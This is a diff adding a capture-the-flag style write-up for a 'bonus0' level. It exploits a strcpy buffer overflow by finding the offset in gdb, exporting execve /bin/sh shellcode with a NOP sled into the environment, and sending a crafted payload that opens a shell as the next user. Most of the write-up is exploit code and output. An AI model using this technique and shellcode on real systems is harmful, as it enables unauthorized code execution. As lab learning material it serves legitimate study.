@@ -1,0 +1,72 @@
+- we run the program and we found that the program read from the stdin.
+
+- After disassembling the program:
+
+- A call pp() function, and this function call the p() function 2 times.
+
+- The p() function print a " - " and reads from stdin, then the pp() function concatenates these 2 strings and prints them into stdout.
+
+- Before the concatenation, there is a call to strcpy which is vulnerable to buffer overflow.
+
+- After running the program with a pattern to get the offset we found that the program segfault at 0x41336141.
+
+=> the offset is 9.
+
+- But we need to know which string that segfault.
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+
+- So the offset is on the second string.
+
+- The problem here is that the program reads 2 times from stdin and our exploit needs to be on the second string so it's hard to send the 2 params using a single file.
+
+
+- we see that the fread function read with the size = 0x1000 = 4096. so we'll try to fill it and the rest will be written to the second buffer.
+
+- also we see a call to strchr which is looking for a '\n' (corresponding to the 'Enter' key pressed).
+
+- The last thing that we need is a shellcode to run a shell (http://shell-storm.org/shellcode/files/shellcode-752.php)
+
+- So our exploit will be:
+1- The buffer of the first param. (4095)
+2- Write \n char.
+3- the address of our shellcode that will be exported to the env.
+4- Fill the second param.
+
+
+- Export our shellcode.
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+
+
+- We need a small program to get the address of our shellcode.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+    printf("%s is %p\n", argv[1], getenv(argv[1]));
+}
+
+$> ./a.out SHELLCODE
+SHELLCODE is 0xbffff6ed
+
+- Now, prepare our payload:
+
+Fill first param + \n + OFSSET + Shellcode addr + fill more 20 char
+
+$> python -c "print 'A' * 4095  + '\n' + 'A' * 9 + '\xd9\xf4\xff\xbf' + 'A' * 30" > /tmp/ayoub
+
+$> cat /tmp/ayoub - | ./bonus0
+ - 
+ - 
+whoami
+bonus1
